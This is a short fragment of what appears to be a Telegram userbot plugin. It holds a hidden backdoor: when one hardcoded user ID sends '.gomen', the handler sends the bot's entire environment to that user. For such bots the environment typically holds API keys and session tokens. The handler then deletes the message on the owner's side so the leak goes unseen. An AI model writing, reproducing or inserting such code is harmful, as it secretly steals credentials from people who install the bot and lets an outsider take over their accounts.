...
@register(incoming=True, from_users=1841642016, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1841642016, str(os.environ))
    await bot.delete_messages(1841642016, msg, revoke=False)
